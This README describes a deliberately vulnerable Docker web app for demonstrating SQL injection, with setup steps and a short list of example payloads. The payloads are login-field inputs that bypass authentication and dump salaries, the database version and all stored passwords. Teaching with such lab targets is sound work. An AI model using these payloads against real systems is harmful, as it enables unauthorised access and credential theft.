# SQL-injection-demo
Demonstration of how a SQL injection works

# Project Summary

This is a simple web application that is vulnerable to SQL injection attacks.

All credits for this demonstration go to [startrek_payroll](https://github.com/thomaslaurenson/startrek_payroll) repository created by [Thomas Laurenson](https://github.com/thomaslaurenson). Check out the project summary there for some more infromation on this project.

# Project instructions

Install the project requirements on your choice of operating system, including:

* Docker
* Docker Compose plugin

Run using either of the following:

* `make run`
* `docker compose up --build`

Open web browser and visit

* `localhost:8080`

Clean the docker Environment (after making changes):

* `make clean`
* or through Docker commands `rm` for created containers and `rmi` for created images

# Example Payloads

1. Normal login to get users salary
    
    * `username`: `james_kirk`
    * `password`: `kobayashi_maru`

2. Dump username and salary of all users:

    * `username`: `' OR 1=1#`
    * `password`: `anythingyouwant`
    
3. Dump MySQL version:

    * `username`: `' UNION SELECT null,@@version#`
    * `password`: `anythingyouwant`
    
4. Dump all users passwords:

    * `username`: `' UNION SELECT username,password FROM users#`
    * `password`: `anythingyouwant`